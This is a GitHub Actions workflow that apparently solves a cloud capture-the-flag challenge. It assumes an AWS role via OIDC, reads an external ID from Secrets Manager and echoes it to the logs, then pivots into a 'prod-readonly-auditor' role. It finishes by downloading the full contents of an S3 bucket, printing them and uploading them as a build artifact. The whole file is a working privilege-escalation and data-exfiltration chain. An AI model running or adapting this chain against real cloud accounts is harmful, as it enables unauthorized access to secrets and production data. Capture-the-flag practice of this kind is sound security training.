name: ca

on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  ScanVulns:
    runs-on: ubuntu-latest
    env:
      AWS_REGION: us-west-2

    steps:
      - name: Configure AWS credentials via OIDC
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::170974506515:role/github-deployment-role
          role-session-name: oidc-base
          aws-region: us-west-2

      - name: Extract External ID from secret
        run: |
          SECRET_JSON=$(aws secretsmanager get-secret-value \
            --secret-id internal/secrets/id-v2 \
            --region us-west-2 \
            --query 'SecretString' \
            --output text)
          
          EXTERNAL_ID=$(echo "$SECRET_JSON" | jq -r '.external_id')
          echo "External ID is: $EXTERNAL_ID"
          echo "EXTERNAL_ID=$EXTERNAL_ID" >> $GITHUB_ENV

      - name: ASSUME ROLE WITH EXTERNAL ID - THIS IS THE FIX!
        run: |
          # THIS LINE IS THE KEY - ADD --external-id parameter!
          aws sts assume-role \
            --role-arn "arn:aws:iam::170974506515:role/prod-readonly-auditor" \
            --role-session-name "ctf-pivoted" \
            --external-id "$EXTERNAL_ID" \
            --output json > assumed_role.json
          
          # Export the new credentials
          export AWS_ACCESS_KEY_ID=$(cat assumed_role.json | jq -r '.Credentials.AccessKeyId')
          export AWS_SECRET_ACCESS_KEY=$(cat assumed_role.json | jq -r '.Credentials.SecretAccessKey')
          export AWS_SESSION_TOKEN=$(cat assumed_role.json | jq -r '.Credentials.SessionToken')
          
          # Save to GitHub env
          echo "AWS_ACCESS_KEY_ID=$AWS_ACCESS_KEY_ID" >> $GITHUB_ENV
          echo "AWS_SECRET_ACCESS_KEY=$AWS_SECRET_ACCESS_KEY" >> $GITHUB_ENV
          echo "AWS_SESSION_TOKEN=$AWS_SESSION_TOKEN" >> $GITHUB_ENV
          
          echo "Successfully assumed prod-readonly-auditor role!"
          aws sts get-caller-identity

      - name: GET THE FLAG FROM S3
        run: |
          echo "=== Listing S3 bucket ==="
          aws s3 ls s3://ci-deployment-logsv1/ --recursive --region us-west-2
          
          echo "=== Downloading all files ==="
          aws s3 sync s3://ci-deployment-logsv1/ ./flag-files/ --region us-west-2
          
          echo "=== Showing all files ==="
          ls -la flag-files/
          
          echo "=== Displaying content ==="
          for file in $(find flag-files -type f 2>/dev/null); do
              echo "========== $file =========="
              cat "$file"
              echo ""
          done

      - name: Upload flag files
        if: always()
        uses: actions/upload-artifact@v4
        with:
          name: flag-output
          path: flag-files/
